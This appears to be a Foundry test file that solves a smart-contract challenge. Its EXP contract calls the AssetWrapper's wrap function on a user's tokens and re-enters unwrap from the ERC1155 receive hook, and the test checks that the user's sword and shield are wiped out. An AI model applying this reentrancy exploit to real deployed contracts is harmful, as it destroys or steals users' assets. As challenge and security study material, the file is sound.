// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;


import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {GameAsset} from "../src/game-assets/GameAsset.sol";
import {AssetWrapper} from "../src/game-assets/AssetWrapper.sol";

contract gameAsset is Test {
    AssetWrapper public assetWrapper;
    GameAsset public swordAsset;
    GameAsset public shieldAsset;
    EXP public exp;
    address exploiter;
    address user;

    function setUp() public {
        exploiter = makeAddr("exploiter");
        user = makeAddr("user");

        // deploy contract
        assetWrapper = new AssetWrapper("AssetWrapper");
        swordAsset = new GameAsset("SWORD", "SWORD");
        shieldAsset = new GameAsset("SHIELD", "SHIELD");

        vm.label(address(assetWrapper), "AssetWrapper");
        vm.label(address(swordAsset), "SWORD");
        vm.label(address(shieldAsset), "SHIELD");
        
        assetWrapper.updateWhitelist(address(swordAsset));
        assetWrapper.updateWhitelist(address(shieldAsset));

        swordAsset.setOperator(address(assetWrapper));
        shieldAsset.setOperator(address(assetWrapper));

        swordAsset.mintForUser(user, 1);
        shieldAsset.mintForUser(user, 1);

        assertEq(swordAsset.balanceOf(user), 1);
        assertEq(shieldAsset.balanceOf(user), 1);
    }

    function testExploit() public {
        vm.startPrank(exploiter);
        exp = new EXP(address(assetWrapper));
        exp.exploit(address(swordAsset));
        exp.exploit(address(shieldAsset));
        vm.stopPrank();
        verify();
    }

    function verify() internal {
        assertEq(swordAsset.balanceOf(user), 0);
        assertEq(shieldAsset.balanceOf(user), 0);
        assertEq(shieldAsset.balanceOf(address(assetWrapper)), 1);
        assertEq(shieldAsset.balanceOf(address(assetWrapper)), 1);
        assertEq(assetWrapper.balanceOf(user, 0), 0);
        assertEq(assetWrapper.balanceOf(user, 1), 0);
        console.log(unicode"😄 pwn! ");
    }
}

/*##############################EXPLOIT##############################*/
contract EXP {
    AssetWrapper public assetWrapper;
    address GameAsset;
    constructor(address AssetWrapperAddress) {
        assetWrapper = AssetWrapper(AssetWrapperAddress);
    }
    function exploit(address GameAssetAddress) external {
        GameAsset =GameAssetAddress;
        assetWrapper.wrap(0, address(this), address(GameAsset));
    }

    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4) {
        assetWrapper.unwrap(address(this), address(GameAsset));
        return this.onERC1155Received.selector;
    }
}